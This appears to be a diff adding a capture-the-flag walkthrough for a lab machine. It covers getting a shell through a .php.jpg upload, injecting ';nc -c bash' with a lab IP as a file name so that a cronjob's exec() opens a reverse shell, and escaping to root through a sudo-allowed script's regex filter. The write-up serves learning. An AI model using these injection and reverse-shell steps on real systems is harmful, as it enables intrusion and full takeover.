@@ -1,0 +1,56 @@
+Low Pri shell:
+in uploads page
+using .jpg trojin
+basically do what the video do below :
+https://www.youtube.com/watch?v=nNB9XlRfvzw
+
+remember, the file name has to be .php.jpg to fool the server.
+Not just .jpg.
+if u wanna know the shell code I use, check the file './shellcode_example.php' in this folder.
+
+================================================================================
+
+User Shell:
+Once u get the apache shell, 
+first ls the /home directory to check the user u want to pri
+then , by using ps -aux | grep guly we can found out there's an cronjob:
+/home/guly/check_attack.php
+and there's a vuln in check_attack.php
+-> exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+
+
+look at $value , that's the variable u can control
+and path is in /var/www/html/uploads/ ( declare at the begging of the code )
+
+if we inject ;nc -c bash 10.10.14.246 3333;
+the exec will become : exec("nohup /bin/rm -f $path;nc -c bash 10.10.14.246 3333; > /dev/null 2>&1 &");
+and the nc will be execute so we can get a guly reverse shell
+steps:
+> cd /var/www/html/uploads/
+> touch ';nc -c bash 10.10.14.246 3333;'
+now wait for the server execute the cronjob.
+got reverse shell.
+
+
+================================================================================
+
+Root Shell:
+u can using LinEnum.sh or lse.sh or just sudo -l
+to find the sudo pri part.
+
+sudo -l:
+/usr/local/sbin/changename.sh can run as root without password
+
+and there's also a vuln in changename.sh:
+echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+
+the $x is a variable we can controll
+but there's a filter : regexp="^[a-zA-Z0-9_\ /-]+$"
+but still, we can inject a command like this :
+1 /bin/sh
+so that the vuln code will become : echo $var=1 /bin/sh >> /etc.....
+and after we run the bash file and inject it, we'll got root shell.
+
+
+END.
+
